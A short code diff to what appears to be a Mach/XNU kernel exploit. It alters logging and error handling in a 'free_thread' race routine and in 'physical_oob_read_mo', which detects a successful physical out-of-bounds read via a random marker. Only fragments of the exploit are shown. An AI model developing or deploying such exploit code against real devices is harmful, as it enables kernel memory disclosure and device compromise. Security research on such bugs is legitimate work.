@@ -173,10 +173,16 @@ void *free_thread(void *arg)
 		);
 
 		if (kr != KERN_SUCCESS) {
-			printf("[-] mach_vm_map failed !!!\n");
-            printf("[+] freeTarget: %#llx\n", freeTarget);
-            printf("[+] targetObject: %#x\n", targetObject);
-			FAILURE(0);
+			LOG(
+				"free_thread: mach_vm_map FAILED: kr=%d "
+				"freeTarget=%#llx targetObject=%u targetObjectOffset=%#llx",
+				kr,
+				(unsigned long long)freeTarget,
+				targetObject,
+				(unsigned long long)targetObjectOffset
+			);
+
+			return NULL;
 		}
 
 		raceSync = 0;
@@ -369,6 +375,11 @@ kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t me
 			);
 
 			LOG("physical_oob_read_mo: pread returned %d", r);
+			LOG(
+				"physical_oob_read_mo: marker=%#llx expected=%#llx",
+				*(unsigned long long *)buffer,
+				(unsigned long long)randomMarker
+			);
 			uint64_t marker = *(uint64_t *)buffer;
 			if (marker != randomMarker) {
 				readRaceSucceeded = true;
